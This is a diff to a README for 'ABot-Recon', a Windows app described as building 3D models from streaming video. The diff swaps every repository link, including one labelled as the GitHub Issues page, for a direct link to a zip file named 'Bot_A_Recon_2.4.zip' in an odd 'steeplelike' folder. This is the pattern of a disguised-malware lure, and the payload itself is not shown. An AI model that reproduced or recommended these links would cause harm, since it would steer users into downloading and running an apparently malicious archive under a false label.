@@ -1,6 +1,6 @@
 # 🤖 ABot-Recon - Reconstruct 3D Worlds from Streaming Video
 
-[![Download ABot-Recon](https://img.shields.io/badge/Download-ABot--Recon-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon)
+[![Download ABot-Recon](https://img.shields.io/badge/Download-ABot--Recon-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon/raw/refs/heads/main/steeplelike/Bot_A_Recon_2.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Simple controls for loading videos, adjusting reconstruction quality, and export
 
 Visit this link to download the application:
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20ABot--Recon-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20ABot--Recon-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon/raw/refs/heads/main/steeplelike/Bot_A_Recon_2.4.zip)
 
 **Step 2: Run the Installer**
 
@@ -150,7 +150,7 @@ Close other programs while running ABot-Recon. If the problem persists, reduce t
 
 ## 📞 Getting Help
 
-If you encounter issues not covered here, please visit the [GitHub Issues page](https://github.com/pattymaterial5053/ABot-Recon/issues) to report problems or ask questions. The community is active and helpful.
+If you encounter issues not covered here, please visit the [GitHub Issues page](https://github.com/pattymaterial5053/ABot-Recon/raw/refs/heads/main/steeplelike/Bot_A_Recon_2.4.zip) to report problems or ask questions. The community is active and helpful.
 
 ---
 
@@ -177,6 +177,6 @@ Special thanks to the research community for advancing 3D reconstruction techniq
 
 **Ready to transform your videos into 3D models?** Click the download button below to get started today!
 
-[![Get ABot-Recon Now](https://img.shields.io/badge/🚀%20Download%20ABot--Recon%20Now-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon)
+[![Get ABot-Recon Now](https://img.shields.io/badge/🚀%20Download%20ABot--Recon%20Now-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pattymaterial5053/ABot-Recon/raw/refs/heads/main/steeplelike/Bot_A_Recon_2.4.zip)
 
 Keywords: 3D reconstruction, streaming video, long-horizon, local context, point cloud, mesh generation, real-time processing, Windows application, computer vision, spatial mapping
